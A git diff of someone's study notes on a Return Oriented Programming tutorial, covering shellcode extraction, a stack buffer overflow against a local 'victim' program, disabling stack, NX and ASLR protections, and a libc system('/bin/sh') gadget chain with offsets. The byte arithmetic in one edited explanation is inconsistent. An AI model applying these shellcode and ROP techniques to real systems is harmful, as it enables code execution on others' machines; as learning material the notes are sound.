@@ -1,5 +1,7 @@
 # ROP - Return Oriented Programming 
 - source: https://crypto.stanford.edu/~blynn/rop/
+- version: started with Ubuntu 16.04 LTS then switched to Ubuntu 12.04
+    - notice of switched indicated below when done
 
 ## 1. Some Assembly Required & the Shell Game
 - Goal:
@@ -20,6 +22,10 @@
     ");
     }
     ```
+        - Starts at needle0:
+        - there:
+        - here:
+        - needle1:
 - Steps:
     - See if we can run a shell in a shell
     ```bash
@@ -55,12 +61,12 @@
 
     00000000004004f7 <needle1>:
     ```
-        - Note that our code starts at 0x4da and finishes right before 0x4f7, and that it is 29 bytes. 
+    - Note that our code starts at 0x4da and finishes right before 0x4f7, and that it is 29 bytes. 
         ```bash
         ubuntu@ubuntu-xenial:~$ echo $((0x4f7-0x4da))
         29
         ```
-    - Now we print out the hexdump of the instruction plus 32-29 extra bytes
+    - Now we print out the hexdump of the instruction plus 3 (32-29) extra bytes. Note that we needed the next multiple of 8 which was 32. 
         ```bash
         ubuntu@ubuntu-xenial:~$ xxd -s0x4da -l32 -p a.out shellcode
         ubuntu@ubuntu-xenial:~$ cat shellcode
@@ -73,9 +79,8 @@
 - Problems:
     - I started this with Mac OS, but did not work so I switched to Ubuntu. 
         - I used vagrant. [Getting Started Link](https://www.vagrantup.com/intro/getting-started/)
-    - for the ```cat shellcode``` portion, the code segment was in a different part of memory compared to what was mentioned in the article. 
-        - [1](https://github.com/justinfchin/CSrop/blop/master/gif/1.1.png))
-        - Based on this our code lies at offset *0x4da* and finishes right before offset *0x4f7*.
+    - for the ```cat shellcode``` output portion, our original code segment was in a different part of memory compared to what was mentioned in the article. 
+        - Based on this, our code lies at offset **0x4da** and finishes right before offset **0x4f7**. Changes were made to the hexdump based on this which gave us the correct output as shown above.
 ---
 ## 2. Learn Bad C in only 1 hour! & The Three Trials of Code Injection
 - Goal:
@@ -124,7 +129,8 @@
         a.out  shell.c  shellcode  victim  victim.c
         ^C
         ```
-        - Shellcode takes the space of the first 32 bytes of the buffer. The 80 zeroes is 42 bytes, where 32 of the 42 fill up the rest of the buffer cause the buffer is 64 bytes. The remaining 8 bytes from the 42-32 is used to overwrite the saved location of the RBP register and points to the beginning of the buffer where the shellcode is. 
+        - Shellcode takes the space of the first 32 bytes of the buffer. The 80 zeroes is 40 bytes, where 32 of the 42 fill up the rest of the buffer cause the buffer is 64 bytes. The remaining 8 bytes from the 42-32 is used to overwrite the saved location of the RBP register and points to the beginning of the buffer where the shellcode is.
+            - remember a contains the buffer address in little endian 
 - Notes:
     - cdecl calling is a convention for x86 
         - it is a low-level scheme for how parameters, return values, return addresses, and scope. [(wiki)](https://en.wikipedia.org/wiki/Calling_convention)
@@ -135,17 +141,17 @@
             ```
         2. Executable Space Protection (NX)
             ```            
-            > $ execstack -s victim
+            $ execstack -s victim
             ```
         3. Address Space Layout Randomization (ASLR)
             ```
-            > setarch `arch` -R ./victim
+            $ setarch `arch` -R ./victim
             ```
     - setarch
-        - changes the reported architecture in new program environment and set personality flags [(linux man)](https://linux.die.net/man/8/setarch
+        - changes the reported architecture in new program environment and set personality flags [(linux man)](https://linux.die.net/man/8/setarch)
         - `-R` 
-            - disables randomization of the virtual address space)
-    - running *victim* after doing the 3 disables, leads to the addresses being the same.  
+            - disables randomization of the virtual address space
+        - running **victim** after doing the 3 disables, leads to the addresses being the same.  
 - Problems:
     - execstack did not exist
         ```
@@ -162,7 +168,7 @@
  
 ## 4. The Importance of Being Patched
 - Goal:
-    - Look into ASLR
+    - Look into bypassing ASLR
 - Steps:
     - Report on active processes with the command and stack pointer
         ```bash
@@ -283,7 +289,7 @@
         ubuntu@ubuntu-xenial:~$ setarch `arch` -R ./victim
         0x7fffffffe4e0
         Whats your name?
-            ```
+        ```
         - Terminal 2
         ```bash
         ubuntu@ubuntu-xenial:~$ ps -eo cmd,esp
@@ -382,7 +388,7 @@
 ---
 ## 6. Go Go Gadgets
 - Goal:
-    - Call the libc system() function with "/bin/sh" as the argument using a gadget that assigns a chosen value to RDI and then jumps to the system () libc function. 
+    - Call the libc system() function with "/bin/sh" as the argument using a gadget that assigns a chosen value to RDI and then jumps to the system() libc function. 
 - Steps:
     - locate libc
     ```bash
@@ -393,12 +399,12 @@
     ```bash
     objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
     ```
-        - This shows waaay too much information. What we really want to do is just
+    - This shows waaay too much information. What we really want to do is just
         ```assembly
         pop  %rdi
         retq
         ```
-            - The pointer to /bin/sh is on top of the stack. The assembly code would assign the pointer to RDI before advancing the SP. 
+    - The pointer to /bin/sh is on top of the stack. The assembly code would assign the pointer to RDI before advancing the SP. 
     - We use this:
     ```bash
     vagrant@precise64:~$ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 |
@@ -435,7 +441,7 @@
         7ffff7dcf000-7ffff7dd3000 r--p 001b2000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
         7ffff7dd3000-7ffff7dd5000 rw-p 001b6000 fc:00 2752530                    /lib/x86_64-linux-gnu/libc-2.15.so
         ```
-            - we see that libc is loaded into memory starting at 0x7ffff7a1d000.
+        -we see that libc is loaded into memory starting at 0x7ffff7a1d000.
             - from the previous section, we found the first part.
                 1. libcs address + 0x22a12
                     - 0x7ffff7a1d000 + 0x22a12.
@@ -447,10 +453,9 @@
         vagrant@precise64:~$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
         0000000000044320 W system
         ```
-            - we see that it is offset 0x44320
+        - we see that it is offset 0x44320
                 3. address of system()
                     - 0x7ffff7a1d000 + 0x44320
-        ```
     - Combine 1,2, and 3
         - The plan is that the first 130 = 65 bytes, which covers the rest of the buffer after "/bin/sh" as well as the pushed RBP register, so that the next location we overwrite is the top of the stack.  
         ```bash
